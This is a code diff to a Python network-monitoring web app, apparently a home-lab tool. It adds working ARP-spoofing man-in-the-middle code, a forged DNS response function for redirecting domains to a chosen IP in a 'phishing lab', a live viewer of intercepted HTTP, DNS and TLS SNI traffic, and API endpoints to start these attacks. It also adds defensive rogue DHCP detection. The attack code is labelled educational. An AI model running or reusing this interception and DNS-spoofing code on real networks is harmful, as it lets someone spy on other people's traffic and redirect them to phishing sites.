@@ -50,7 +50,7 @@ except ImportError:
 
 # Optional imports — graceful fallback
 try:
-    from scapy.all import ARP, Ether, srp, send, conf, sniff, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, TLS, TLSClientHello
+    from scapy.all import ARP, Ether, srp, send, conf, sniff, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, TLS, TLSClientHello, DHCP, DNSRR
 
     SCAPY_AVAILABLE = True
 except ImportError:
@@ -68,6 +68,9 @@ DNS_QUERY_LIMIT = 1000  # Keep last 1000 queries
 arp_table = {}  # ip -> set of macs
 MITM_ALERTS = []
 
+# Active MITM attacks tracking
+active_mitm_attacks = {}  # target_ip -> {thread, active, dns_spoof}
+
 # JA3 fingerprints storage
 ja3_fingerprints = []
 JA3_LIMIT = 500
@@ -79,6 +82,13 @@ KNOWN_MALWARE_JA3 = {
     "73f017cd0d801d6fd1df88b7c9bcff73": "TrickBot",
     "328734b8d9d4e1f8e7d705a3286e19ea": "QakBot",
 }
+
+# Traffic viewer storage - live HTTP/DNS queries
+live_traffic = []
+LIVE_TRAFFIC_LIMIT = 500
+
+# Rogue DHCP detection
+ROGUE_DHCP_ALERTS = []
 
 try:
     from mac_vendor_lookup import MacLookup
@@ -1400,6 +1410,191 @@ def unblock_device(target_ip, gateway_ip):
 
 
 # ============================================================
+# MITM ATTACK SIMULATOR (Educational - Start/Stop per device)
+# ============================================================
+def start_mitm_attack(target_ip, enable_dns_spoof=False, fake_ip=None):
+    """
+    Start MITM attack simulation on a single target device.
+    For educational purposes only - demonstrates ARP spoofing vulnerability.
+    """
+    global active_mitm_attacks
+    
+    if not SCAPY_AVAILABLE:
+        return False, "Scapy not installed"
+    
+    if target_ip in active_mitm_attacks and active_mitm_attacks[target_ip].get("active", False):
+        return False, "MITM attack already running on this target"
+    
+    target_mac = get_mac_from_arp(target_ip)
+    if not target_mac:
+        return False, "Could not resolve target MAC address"
+    
+    gateway_ip = get_default_gateway()
+    gateway_mac = get_mac_from_arp(gateway_ip)
+    if not gateway_mac:
+        return False, "Could not resolve gateway MAC address"
+    
+    # Use provided fake IP or default to local server for DNS spoof
+    if fake_ip is None:
+        fake_ip = get_local_ip()
+    
+    def mitm_loop(target_ip, gateway_ip, target_mac, gateway_mac, dns_spoof_enabled, fake_dns_ip):
+        try:
+            while active_mitm_attacks.get(target_ip, {}).get("active", False):
+                # ARP spoof target: tell target we are gateway
+                send(
+                    ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
+                    verbose=0,
+                )
+                # ARP spoof gateway: tell gateway we are target
+                send(
+                    ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
+                    verbose=0,
+                )
+                
+                # If DNS spoofing enabled, also intercept DNS queries
+                if dns_spoof_enabled:
+                    # This is handled in packet_handler via DNS response spoofing
+                    pass
+                
+                time.sleep(1)
+        except Exception as e:
+            print(f"[!] MITM loop error: {e}")
+        finally:
+            # Cleanup: restore ARP tables
+            try:
+                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=0)
+                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=0)
+            except:
+                pass
+    
+    active_mitm_attacks[target_ip] = {"active": True, "dns_spoof": enable_dns_spoof, "fake_ip": fake_ip}
+    t = threading.Thread(
+        target=mitm_loop, 
+        args=(target_ip, gateway_ip, target_mac, gateway_mac, enable_dns_spoof, fake_ip), 
+        daemon=True
+    )
+    t.start()
+    active_mitm_attacks[target_ip]["thread"] = t
+    
+    # Log to audit
+    conn = get_db()
+    conn.execute(
+        """
+        INSERT INTO audit_log (timestamp, action_type, device_ip, user, details, success)
+        VALUES (?, 'start_mitm', ?, ?, ?, ?)
+    """,
+        (datetime.now().isoformat(), target_ip, current_user.username if current_user.is_authenticated else "system", 
+         f"MITM started with DNS spoof={enable_dns_spoof}", 1),
+    )
+    conn.commit()
+    conn.close()
+    
+    return True, f"MITM attack simulation started on {target_ip}"
+
+
+def stop_mitm_attack(target_ip):
+    """Stop MITM attack simulation on a target device."""
+    global active_mitm_attacks
+    
+    if target_ip not in active_mitm_attacks:
+        return False, "No MITM attack running on this target"
+    
+    active_mitm_attacks[target_ip]["active"] = False
+    time.sleep(2)  # Wait for loop to stop and ARP restoration
+    
+    if target_ip in active_mitm_attacks:
+        del active_mitm_attacks[target_ip]
+    
+    # Log to audit
+    conn = get_db()
+    conn.execute(
+        """
+        INSERT INTO audit_log (timestamp, action_type, device_ip, user, details, success)
+        VALUES (?, 'stop_mitm', ?, ?, ?, ?)
+    """,
+        (datetime.now().isoformat(), target_ip, current_user.username if current_user.is_authenticated else "system",
+         "MITM stopped", 1),
+    )
+    conn.commit()
+    conn.close()
+    
+    return True, f"MITM attack simulation stopped on {target_ip}"
+
+
+def get_active_mitm_attacks():
+    """Get list of currently active MITM attacks."""
+    global active_mitm_attacks
+    result = []
+    for ip, info in active_mitm_attacks.items():
+        result.append({
+            "target_ip": ip,
+            "active": info.get("active", False),
+            "dns_spoof_enabled": info.get("dns_spoof", False),
+            "fake_ip": info.get("fake_ip", "")
+        })
+    return result
+
+
+# ============================================================
+# DNS SPOOF SIMULATOR (Educational - Phishing Lab)
+# ============================================================
+DNS_SPOOF_RULES = {}  # domain -> fake_ip
+
+def add_dns_spoof_rule(domain, fake_ip):
+    """Add a DNS spoof rule - when target queries domain, return fake_ip."""
+    global DNS_SPOOF_RULES
+    DNS_SPOOF_RULES[domain.lower()] = fake_ip
+    return True, f"DNS spoof rule added: {domain} -> {fake_ip}"
+
+
+def remove_dns_spoof_rule(domain):
+    """Remove a DNS spoof rule."""
+    global DNS_SPOOF_RULES
+    if domain.lower() in DNS_SPOOF_RULES:
+        del DNS_SPOOF_RULES[domain.lower()]
+        return True, f"DNS spoof rule removed: {domain}"
+    return False, "Rule not found"
+
+
+def get_dns_spoof_rules():
+    """Get all active DNS spoof rules."""
+    global DNS_SPOOF_RULES
+    return [{"domain": d, "fake_ip": ip} for d, ip in DNS_SPOOF_RULES.items()]
+
+
+def spoof_dns_response(packet, domain, original_dns_server):
+    """Craft a fake DNS response returning our fake IP."""
+    fake_ip = DNS_SPOOF_RULES.get(domain.lower(), get_local_ip())
+    
+    # Craft DNS response packet
+    dns_response = Ether(
+        src=packet[Ether].dst,  # Our MAC
+        dst=packet[Ether].src   # Target MAC
+    ) / IP(
+        src=original_dns_server,  # Pretend to be DNS server
+        dst=packet[IP].src
+    ) / UDP(
+        sport=53,
+        dport=packet[UDP].dport
+    ) / DNS(
+        id=packet[DNS].id,
+        qr=1,      # Response
+        aa=1,      # Authoritative
+        qd=packet[DNS].qd,
+        an=DNSRR(
+            rrname=domain,
+            rdata=fake_ip,
+            type="A",
+            ttl=60
+        )
+    )
+    
+    send(dns_response, verbose=0)
+    return fake_ip
+
+
+# ============================================================
 # PACKET SNIFFING WITH DNS, MITM, AND JA3 DETECTION
 # ============================================================
 def calculate_ja3(packet):
@@ -1618,12 +1813,84 @@ def process_tls_fingerprint(packet, source_ip, source_mac):
 
 
 def packet_handler(packet):
-    """Handle captured packets with DNS, MITM, and JA3 detection."""
-    global captured_packets
+    """Handle captured packets with DNS, MITM, JA3 detection, and live traffic logging."""
+    global captured_packets, live_traffic
+    
+    # Rogue DHCP detection
+    if DHCP in packet and packet.haslayer(DHCP):
+        detect_rogue_dhcp(packet)
+    
     try:
         if IP in packet:
             source_ip = packet[IP].src
             source_mac = packet[Ether].src.upper() if Ether in packet else "unknown"
+            
+            # Live traffic viewer - log HTTP hostnames and DNS queries
+            traffic_entry = None
+            
+            # Extract HTTP Host header
+            if TCP in packet and Raw in packet:
+                try:
+                    payload = packet[Raw].load.decode('utf-8', errors='ignore')
+                    if 'Host:' in payload or 'HTTP' in payload:
+                        lines = payload.split('\r\n')
+                        for line in lines:
+                            if line.lower().startswith('host:'):
+                                host = line.split(':', 1)[1].strip()
+                                traffic_entry = {
+                                    "timestamp": datetime.now().isoformat(),
+                                    "type": "HTTP",
+                                    "source_ip": source_ip,
+                                    "source_mac": source_mac,
+                                    "domain": host,
+                                    "details": f"HTTP request to {host}"
+                                }
+                                break
+                except:
+                    pass
+            
+            # Process DNS queries (also adds to live traffic)
+            if DNS in packet and DNSQR in packet:
+                process_dns_query(packet, source_ip, source_mac)
+                # Also add to live traffic for real-time view
+                query_name = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
+                traffic_entry = {
+                    "timestamp": datetime.now().isoformat(),
+                    "type": "DNS",
+                    "source_ip": source_ip,
+                    "source_mac": source_mac,
+                    "domain": query_name,
+                    "details": f"DNS query: {query_name}"
+                }
+                
+                # Check for DNS spoof rules and respond with fake IP if matched
+                if DNS_SPOOF_RULES and query_name.lower() in DNS_SPOOF_RULES:
+                    # Find original DNS server
+                    dns_server_ip = packet[IP].dst
+                    fake_ip = spoof_dns_response(packet, query_name, dns_server_ip)
+                    traffic_entry["details"] += f" [SPOOFED -> {fake_ip}]"
+            
+            # Extract SNI from TLS ClientHello (HTTPS domains without decryption)
+            if TLS in packet and TLSClientHello in packet:
+                try:
+                    sni = packet[TLSClientHello].extensions[0].servername.decode('utf-8', errors='ignore')
+                    if sni:
+                        traffic_entry = {
+                            "timestamp": datetime.now().isoformat(),
+                            "type": "TLS_SNI",
+                            "source_ip": source_ip,
+                            "source_mac": source_mac,
+                            "domain": sni,
+                            "details": f"HTTPS connection to {sni} (from SNI)"
+                        }
+                except:
+                    pass
+            
+            # Add to live traffic if we have an entry
+            if traffic_entry:
+                live_traffic.append(traffic_entry)
+                if len(live_traffic) > LIVE_TRAFFIC_LIMIT:
+                    live_traffic = live_traffic[-LIVE_TRAFFIC_LIMIT:]
             
             packet_info = {
                 "timestamp": datetime.now().isoformat(),
@@ -1650,10 +1917,6 @@ def packet_handler(packet):
             else:
                 packet_info["protocol_name"] = "OTHER"
 
-            # Process DNS queries
-            if DNS in packet and DNSQR in packet:
-                process_dns_query(packet, source_ip, source_mac)
-            
             # Detect MITM attacks
             detect_mitm(packet)
             
@@ -1667,6 +1930,72 @@ def packet_handler(packet):
                 captured_packets = captured_packets[-1000:]
     except Exception as e:
         print(f"[!] Error processing packet: {e}")
+
+
+# ============================================================
+# ROGUE DHCP DETECTOR
+# ============================================================
+def detect_rogue_dhcp(packet):
+    """Detect rogue DHCP servers by monitoring DHCP Offer packets."""
+    global ROGUE_DHCP_ALERTS
+    
+    try:
+        if not packet.haslayer(DHCP):
+            return
+        
+        dhcp_options = packet[DHCP].options
+        message_type = None
+        server_id = None
+        
+        for opt in dhcp_options:
+            if isinstance(opt, tuple):
+                if opt[0] == 'message-type':
+                    message_type = opt[1]
+                elif opt[0] == 'server_id':
+                    server_id = opt[1]
+        
+        # DHCP Offer (type 2) or DHCP ACK (type 5) from unexpected server
+        if message_type in [2, 5]:  # OFFER or ACK
+            # Get the actual sender MAC/IP
+            if Ether not in packet or IP not in packet:
+                return
+            
+            sender_mac = packet[Ether].src.upper()
+            sender_ip = packet[IP].src
+            
+            # Check if this is from our legitimate gateway
+            gateway_ip = get_default_gateway()
+            
+            # If not from gateway, it's a rogue DHCP server!
+            if sender_ip != gateway_ip and server_id != gateway_ip:
+                alert_msg = f"Rogue DHCP Server detected! MAC: {sender_mac}, IP: {sender_ip}, pretending to offer: {server_id}"
+                
+                rogure_entry = {
+                    "timestamp": datetime.now().isoformat(),
+                    "rogue_mac": sender_mac,
+                    "rogue_ip": sender_ip,
+                    "offered_server": server_id,
+                    "message_type": "DHCP_OFFER" if message_type == 2 else "DHCP_ACK"
+                }
+                
+                ROGUE_DHCP_ALERTS.append(rogure_entry)
+                if len(ROGUE_DHCP_ALERTS) > 50:
+                    ROGUE_DHCP_ALERTS = ROGUE_DHCP_ALERTS[-50:]
+                
+                generate_alert("rogue_dhcp", alert_msg, sender_mac)
+                print(f"[!] ROGUE DHCP SERVER DETECTED: {alert_msg}")
+                
+                # Log to audit
+                conn = get_db()
+                conn.execute("""
+                    INSERT INTO audit_log (timestamp, action_type, device_mac, device_ip, details, success)
+                    VALUES (?, 'rogue_dhcp_detected', ?, ?, ?, 1)
+                """, (datetime.now().isoformat(), sender_mac, sender_ip, alert_msg))
+                conn.commit()
+                conn.close()
+                
+    except Exception as e:
+        print(f"[!] Rogue DHCP detection error: {e}")
 
 
 def start_packet_capture(interface=None, filter_str="", count=0):
@@ -2492,6 +2821,95 @@ def api_mitm_alerts():
     global MITM_ALERTS
     limit = request.args.get("limit", 50, type=int)
     return jsonify(MITM_ALERTS[-limit:] if MITM_ALERTS else [])
+
+
+@app.route("/api/rogue-dhcp-alerts")
+@login_required
+def api_rogue_dhcp_alerts():
+    """Get Rogue DHCP server alerts."""
+    global ROGUE_DHCP_ALERTS
+    limit = request.args.get("limit", 50, type=int)
+    return jsonify(ROGUE_DHCP_ALERTS[-limit:] if ROGUE_DHCP_ALERTS else [])
+
+
+@app.route("/api/live-traffic")
+@login_required
+def api_live_traffic():
+    """Get live traffic viewer data (HTTP hostnames, DNS queries, TLS SNI)."""
+    global live_traffic
+    limit = request.args.get("limit", 100, type=int)
+    return jsonify(live_traffic[-limit:] if live_traffic else [])
+
+
+@app.route("/api/active-mitm", methods=["GET"])
+@login_required
+def api_get_active_mitm():
+    """Get list of currently active MITM attacks."""
+    return jsonify(get_active_mitm_attacks())
+
+
+@app.route("/api/devices/<mac>/start-mitm", methods=["POST"])
+@login_required
+def api_start_mitm(mac):
+    """Start MITM attack simulation on a device (educational)."""
+    conn = get_db()
+    device = conn.execute("SELECT ip FROM devices WHERE mac = ?", (mac,)).fetchone()
+    conn.close()
+    
+    if not device:
+        return jsonify({"success": False, "error": "Device not found"}), 404
+    
+    data = request.json or {}
+    enable_dns_spoof = data.get("dns_spoof", False)
+    fake_ip = data.get("fake_ip", None)
+    
+    success, msg = start_mitm_attack(device["ip"], enable_dns_spoof, fake_ip)
+    return jsonify({"success": success, "message": msg})
+
+
+@app.route("/api/devices/<mac>/stop-mitm", methods=["POST"])
+@login_required
+def api_stop_mitm(mac):
+    """Stop MITM attack simulation on a device."""
+    conn = get_db()
+    device = conn.execute("SELECT ip FROM devices WHERE mac = ?", (mac,)).fetchone()
+    conn.close()
+    
+    if not device:
+        return jsonify({"success": False, "error": "Device not found"}), 404
+    
+    success, msg = stop_mitm_attack(device["ip"])
+    return jsonify({"success": success, "message": msg})
+
+
+@app.route("/api/dns-spoof-rules", methods=["GET"])
+@login_required
+def api_get_dns_spoof_rules():
+    """Get all active DNS spoof rules."""
+    return jsonify(get_dns_spoof_rules())
+
+
+@app.route("/api/dns-spoof-rules", methods=["POST"])
+@login_required
+def api_add_dns_spoof_rule():
+    """Add a DNS spoof rule for phishing lab simulation."""
+    data = request.json
+    domain = data.get("domain")
+    fake_ip = data.get("fake_ip")
+    
+    if not domain or not fake_ip:
+        return jsonify({"success": False, "error": "Domain and fake_ip required"}), 400
+    
+    success, msg = add_dns_spoof_rule(domain, fake_ip)
+    return jsonify({"success": success, "message": msg})
+
+
+@app.route("/api/dns-spoof-rules/<domain>", methods=["DELETE"])
+@login_required
+def api_delete_dns_spoof_rule(domain):
+    """Remove a DNS spoof rule."""
+    success, msg = remove_dns_spoof_rule(domain)
+    return jsonify({"success": success, "message": msg})
 
 
 @app.route("/api/stats")
